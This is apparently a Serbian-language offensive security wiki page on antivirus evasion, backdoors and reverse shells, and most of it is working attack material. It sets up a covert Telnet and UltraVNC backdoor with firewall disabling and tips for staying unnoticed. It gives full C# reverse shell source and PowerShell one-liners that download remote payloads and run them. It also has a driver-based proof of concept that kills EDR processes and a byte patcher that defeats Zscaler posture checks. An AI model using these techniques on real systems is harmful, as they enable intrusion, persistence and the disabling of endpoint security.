### **Telnet Server**

Do Windows 10, svi Windows su dolazili sa **Telnet serverom** koji ste mogli instalirati (kao administrator) tako što ćete:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** kada se sistem pokrene i **izvrši** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promenite telnet port** (neprimetno) i onemogućite firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (želite bin preuzimanja, a ne instalaciju)

**NA HOSTU**: Izvršite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim, premestite binarni _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ unutar **žrtve**

#### **Obrnuta veza**

**Napadač** treba da **izvrši unutar** svog **hosta** binarni `vncviewer.exe -listen 5900` kako bi bio **pripremljen** da uhvati obrnutu **VNC vezu**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPWARNING:** Da biste održali neprimetnost, ne smete raditi nekoliko stvari

- Ne pokrećite `winvnc` ako već radi ili ćete aktivirati [popup](https://i.imgur.com/1SROTTl.png). proverite da li radi sa `tasklist | findstr winvnc`
- Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Ne pokrećite `winvnc -h` za pomoć ili ćete aktivirati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će vrlo brzo prekinuti proces.**

### Kompajliranje našeg vlastitog reverznog shell-a

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Reverz shell

Kompajlirajte ga sa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite to sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenje kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuskatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje Pythona za primer izgradnje injektora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Donosite svoj ranjivi drajver (BYOVD) – Ubijanje AV/EDR iz kernel prostora

Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu na krajnjim tačkama pre nego što ispusti ransomware. Alat donosi **svoj ranjivi ali *potpisani* drajver** i zloupotrebljava ga da izvrši privilegovane kernel operacije koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu da blokiraju.

Ključne tačke
1. **Potpisani drajver**: Datoteka isporučena na disk je `ServiceMouse.sys`, ali je binarni fajl legitimno potpisani drajver `AToolsKrnl64.sys` iz “System In-Depth Analysis Toolkit” Antiy Labs. Pošto drajver nosi važeći Microsoft potpis, učitava se čak i kada je omogućena zaštita od potpisivanja drajvera (DSE).
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje drajver kao **kernel servis**, a druga ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz korisničkog prostora.
3. **IOCTL-ovi koje izlaže drajver**
| IOCTL kod | Mogućnost                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Prekini proizvoljan proces po PID-u (koristi se za ubijanje Defender/EDR servisa) |
| `0x990000D0` | Obriši proizvoljnu datoteku na disku |
| `0x990001D0` | Ukloni drajver i izbriši servis |

Minimalni C dokaz koncepta:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto to funkcioniše**: BYOVD potpuno preskoči zaštitu u korisničkom režimu; kod koji se izvršava u kernelu može otvoriti *zaštićene* procese, prekinuti ih ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge funkcije očvršćavanja.

Detekcija / Ublažavanje
•  Omogućite Microsoftovu listu blokiranja ranjivih drajvera (`HVCI`, `Smart App Control`) tako da Windows odbije učitavanje `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i obaveštavajte kada se drajver učita iz direktorijuma koji može da se piše ili nije prisutan na listi dozvoljenih.
•  Pratite rukovanje u korisničkom režimu sa prilagođenim objektima uređaja praćeno sumnjivim pozivima `DeviceIoControl`.

### Zaobilaženje Zscaler Client Connector provere stanja putem patch-ovanja binarnih fajlova na disku

Zscalerov **Client Connector** primenjuje pravila stanja uređaja lokalno i oslanja se na Windows RPC da komunicira rezultate drugim komponentama. Dva slaba dizajnerska izbora omogućavaju potpuno zaobilaženje:

1. Evaluacija stanja se dešava **potpuno na klijentskoj strani** (boolean se šalje serveru).
2. Interni RPC krajnji tačke samo validiraju da je izvršna datoteka koja se povezuje **potpisana od strane Zscalera** (putem `WinVerifyTrust`).

Patch-ovanjem **četiri potpisana binarna fajla na disku** oba mehanizma mogu biti neutralisana:

| Binarni | Originalna logika patch-ovana | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` tako da je svaka provera usklađena |
| `ZSAService.exe` | Indirektni poziv `WinVerifyTrust` | NOP-ed ⇒ bilo koji (čak i nepotpisani) proces može da se poveže na RPC cevi |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta na tunelu | Prekinuto |

Minimalni izvod patch-era:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i ponovnog pokretanja servisnog staka:

* **Sve** provere stanja prikazuju **zelenu/usaglašenu**.
* Nepotpisani ili modifikovani binarni fajlovi mogu otvoriti nazvane RPC krajnje tačke (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup unutrašnjoj mreži definisanoj Zscaler politikama.

Ova studija slučaja pokazuje kako se čiste odluke o poverenju na klijentskoj strani i jednostavne provere potpisa mogu prevazići sa nekoliko bajt patch-eva.

## Reference

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
